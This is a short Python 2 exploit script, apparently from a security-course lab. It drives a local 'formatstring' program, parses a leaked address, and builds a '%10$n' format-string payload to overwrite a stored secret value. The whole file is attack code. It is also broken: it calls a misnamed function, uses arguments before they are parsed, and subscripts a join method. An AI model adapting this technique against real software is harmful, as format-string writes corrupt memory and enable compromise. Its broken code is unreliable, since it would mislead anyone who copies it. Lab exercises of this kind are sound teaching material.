import pexpect, os, subprocess, argparse, binascii

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("--secret_1", type=int, help="Input a value to change what is stored in secret[1\
]", default=0)
    args = parser.parse_args()
    return args

def generate_break_file(size_of_change = 0):
    p = pexpect.spawn("./formatstring", encoding='ascii')
    print p.readline()
    print p.readline()
    print p.readline()

    address_line = p.readline()
    print address_line

    split_string =  address_line.split()
    address = split_string[4]
    last = str('0' + address[0])
    third = str(address[1]+address[2])
    second = str(address[3] + address[4])
    first = str(address[5]+address[6])

    print p.readline()

    flipped_addr = first + second + third + last
    payload = flipped_addr + "".join['41']*size_of_change +" 25 31 30 24 6e"
    create_hex = "echo "+ payload + " > file.hex"
    os.system(create_hex)
    convert_hex = "xxd -r -p file.hex > file"
    os.system(convert_hex)

    p.sendline(flipped_addr)

    print p.readline()
    print p.readline()
    print p.readline()
    print p.readline()
    print p.readline()

def break_program():
    command = "./formatstring < file"
    os.system(command)

def main():
    generate_break_file_(args.secret_1)
    break_program()
    os.system("rm file.hex file")

if __name__ == "__main__":
    main()


    args = get_args()
